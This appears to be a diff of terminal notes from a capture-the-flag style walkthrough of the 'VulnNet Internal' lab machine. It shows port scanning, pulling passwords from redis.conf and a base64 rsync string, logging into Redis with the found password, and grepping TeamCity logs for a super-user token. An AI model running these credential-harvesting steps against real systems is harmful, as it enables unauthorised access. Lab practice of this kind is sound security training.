@@ -1,31 +1,7 @@
 ┌──(mikey㉿kali)-[~/rabbit]
 └─$ nmap -sC -sV -p 1-1000 10.10.40.193
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-17 20:07 IST
-Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
-Connect Scan Timing: About 14.63% done; ETC: 20:07 (0:00:35 remaining)
-Stats: 0:00:33 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
-Connect Scan Timing: About 56.50% done; ETC: 20:08 (0:00:25 remaining)
-Stats: 0:00:34 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
-Connect Scan Timing: About 57.10% done; ETC: 20:08 (0:00:26 remaining)
-Stats: 0:01:16 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
-Service scan Timing: About 40.00% done; ETC: 20:08 (0:00:11 remaining)
-Stats: 0:01:22 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
-Service scan Timing: About 80.00% done; ETC: 20:08 (0:00:03 remaining)
-Stats: 0:01:22 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
-Service scan Timing: About 100.00% done; ETC: 20:08 (0:00:00 remaining)
-Stats: 0:01:27 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
-NSE Timing: About 99.56% done; ETC: 20:08 (0:00:00 remaining)
-Stats: 0:01:29 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
-NSE Timing: About 99.71% done; ETC: 20:08 (0:00:00 remaining)
-Stats: 0:01:29 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
-NSE Timing: About 99.71% done; ETC: 20:08 (0:00:00 remaining)
-Stats: 0:01:40 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
-NSE Timing: About 88.64% done; ETC: 20:08 (0:00:00 remaining)
-Stats: 0:01:41 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
-NSE Timing: About 88.64% done; ETC: 20:08 (0:00:00 remaining)
-Nmap scan report for 10.10.40.193
-Host is up (0.47s latency).
-Not shown: 994 closed tcp ports (conn-refused)
+
 PORT    STATE    SERVICE     VERSION
 6/tcp   filtered unknown
 22/tcp  open     ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
@@ -60,33 +36,6 @@ PORT    STATE    SERVICE     VERSION
 445/tcp open     netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
 873/tcp open     rsync       (protocol version 31)
 Service Info: Host: VULNNET-INTERNAL; OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Host script results:
-|_clock-skew: mean: -39m58s, deviation: 1h09m15s, median: 0s
-|_nbstat: NetBIOS name: VULNNET-INTERNA, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
-| smb-security-mode: 
-|   account_used: guest
-|   authentication_level: user
-|   challenge_response: supported
-|_  message_signing: disabled (dangerous, but default)
-| smb2-security-mode: 
-|   3.1.1: 
-|_    Message signing enabled but not required
-| smb2-time: 
-|   date: 2022-06-17T14:38:29
-|_  start_date: N/A
-| smb-os-discovery: 
-|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
-|   Computer name: vulnnet-internal
-|   NetBIOS computer name: VULNNET-INTERNAL\x00
-|   Domain name: \x00
-|   FQDN: vulnnet-internal
-|_  System time: 2022-06-17T16:38:29+02:00
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 101.22 seconds
-
-
 
 
 
@@ -140,16 +89,12 @@ getting file \temp\services.txt of size 38 as services.txt (0.0 KiloBytes/sec) (
             
  ──(mikey㉿kali)-[/tmp/opt/conf/redis]
 └─$ cat redis.conf | grep -i password
-# 2) No password is configured.
-# If the master is password protected (using the "requirepass" configuration
-# masterauth <master-password>
-# Require clients to issue AUTH <PASSWORD> before processing any other
-# 150k passwords per second against a good box. This means that you should
-# use a very strong password otherwise it will be very easy to break.
-                          
-                           
+
 requirepass "B65Hx562F@ggAZ@F"
 masterauth <master-password>
+        
+redis-cli -h 10.10.65.34 -a "B65Hx562F@ggAZ@F"       
+   
 echo QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg== | base64 -d
 
 Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v
@@ -197,46 +142,9 @@ applicable law.
 
 sys-internal@vulnnet-internal:/TeamCity/conf$ ss -tulwn
 Netid                    State                       Recv-Q                      Send-Q                                                 Local Address:Port                                            Peer Address:Port                     
-icmp6                    UNCONN                      0                           0                                                             *%eth0:58                                                         *:*                        
-udp                      UNCONN                      0                           0                                                            0.0.0.0:57786                                                0.0.0.0:*                        
-udp                      UNCONN                      0                           0                                                            0.0.0.0:54809                                                0.0.0.0:*                        
-udp                      UNCONN                      0                           0                                                            0.0.0.0:50753                                                0.0.0.0:*                        
-udp                      UNCONN                      0                           0                                                            0.0.0.0:36466                                                0.0.0.0:*                        
-udp                      UNCONN                      0                           0                                                            0.0.0.0:929                                                  0.0.0.0:*                        
-udp                      UNCONN                      0                           0                                                            0.0.0.0:2049                                                 0.0.0.0:*                        
-udp                      UNCONN                      0                           0                                                      127.0.0.53%lo:53                                                   0.0.0.0:*                        
-udp                      UNCONN                      0                           0                                                 10.10.120.193%eth0:68                                                   0.0.0.0:*                        
-udp                      UNCONN                      0                           0                                                            0.0.0.0:111                                                  0.0.0.0:*                        
-udp                      UNCONN                      0                           0                                                      10.10.255.255:137                                                  0.0.0.0:*                        
-udp                      UNCONN                      0                           0                                                      10.10.120.193:137                                                  0.0.0.0:*                        
-udp                      UNCONN                      0                           0                                                            0.0.0.0:137                                                  0.0.0.0:*                        
-udp                      UNCONN                      0                           0                                                      10.10.255.255:138                                                  0.0.0.0:*                        
-udp                      UNCONN                      0                           0                                                      10.10.120.193:138                                                  0.0.0.0:*                        
-udp                      UNCONN                      0                           0                                                            0.0.0.0:138                                                  0.0.0.0:*                        
-udp                      UNCONN                      0                           0                                                            0.0.0.0:5353                                                 0.0.0.0:*                        
-udp                      UNCONN                      0                           0                                                            0.0.0.0:53534                                                0.0.0.0:*                        
-udp                      UNCONN                      0                           0                                                               [::]:56798                                                   [::]:*                        
-udp                      UNCONN                      0                           0                                                               [::]:51743                                                   [::]:*                        
-udp                      UNCONN                      0                           0                                                               [::]:39536                                                   [::]:*                        
-udp                      UNCONN                      0                           0                                                               [::]:58091                                                   [::]:*                        
-udp                      UNCONN                      0                           0                                                               [::]:929                                                     [::]:*                        
-udp                      UNCONN                      0                           0                                                               [::]:2049                                                    [::]:*                        
-udp                      UNCONN                      0                           0                                                               [::]:46139                                                   [::]:*                        
-udp                      UNCONN                      0                           0                                                               [::]:111                                                     [::]:*                        
-udp                      UNCONN                      0                           0                                                               [::]:5353                                                    [::]:*                        
-tcp                      LISTEN                      0                           5                                                            0.0.0.0:873                                                  0.0.0.0:*                        
-tcp                      LISTEN                      0                           50                                                           0.0.0.0:139                                                  0.0.0.0:*                        
-tcp                      LISTEN                      0                           128                                                          0.0.0.0:6379                                                 0.0.0.0:*                        
-tcp                      LISTEN                      0                           64                                                           0.0.0.0:36111                                                0.0.0.0:*                        
-tcp                      LISTEN                      0                           128                                                          0.0.0.0:60687                                                0.0.0.0:*                        
-tcp                      LISTEN                      0                           128                                                          0.0.0.0:111                                                  0.0.0.0:*                        
-tcp                      LISTEN                      0                           128                                                          0.0.0.0:37685                                                0.0.0.0:*                        
-tcp                      LISTEN                      0                           128                                                    127.0.0.53%lo:53                                                   0.0.0.0:*                        
-tcp                      LISTEN                      0                           128                                                          0.0.0.0:22                                                   0.0.0.0:*                        
-tcp                      LISTEN                      0                           5                                                          127.0.0.1:631                                                  0.0.0.0:*                        
-tcp                      LISTEN                      0                           50                                                           0.0.0.0:445                                                  0.0.0.0:*                        
-tcp                      LISTEN                      0                           64                                                           0.0.0.0:2049                                                 0.0.0.0:*                        
-tcp                      LISTEN                      0                           128                                                          0.0.0.0:41703                                                0.0.0.0:*                        
+                                      0.0.0.0:*                        
+                                    0.0.0.0:*                        
+                                              0.0.0.0:*                        
 tcp                      LISTEN                      0                           1                                                 [::ffff:127.0.0.1]:8105                                                       *:*                        
 tcp                      LISTEN                      0                           128                                                             [::]:41993                                                   [::]:*                        
 tcp                      LISTEN                      0                           128                                                             [::]:55849                                                   [::]:*                        
@@ -244,14 +152,7 @@ tcp                      LISTEN                      0                          
 tcp                      LISTEN                      0                           128                                                            [::1]:6379                                                    [::]:*                        
 tcp                      LISTEN                      0                           64                                                              [::]:41611                                                   [::]:*                        
 tcp                      LISTEN                      0                           50                                                              [::]:139                                                     [::]:*                        
-tcp                      LISTEN                      0                           100                                               [::ffff:127.0.0.1]:8111                                                       *:*                        
-tcp                      LISTEN                      0                           128                                                             [::]:111                                                     [::]:*                        
-tcp                      LISTEN                      0                           128                                                             [::]:22                                                      [::]:*                        
-tcp                      LISTEN                      0                           128                                                             [::]:37015                                                   [::]:*                        
-tcp                      LISTEN                      0                           5                                                              [::1]:631                                                     [::]:*                        
-tcp                      LISTEN                      0                           50                                                              [::]:445                                                     [::]:*                        
-tcp                      LISTEN                      0                           64                                                              [::]:2049                                                    [::]:*                        
-tcp                      LISTEN                      0                           50                                                                 *:9090                                                       *:*  
+tcp                      LISTEN                      0                           100                                               [::ffff:127.0.0.1]:8111             
 
 sys-internal@vulnnet-internal:/TeamCity/logs$ cat catalina.out | grep -i token
 [TeamCity] Super user authentication token: 8446629153054945175 (use empty username with the token as the password to access the server)
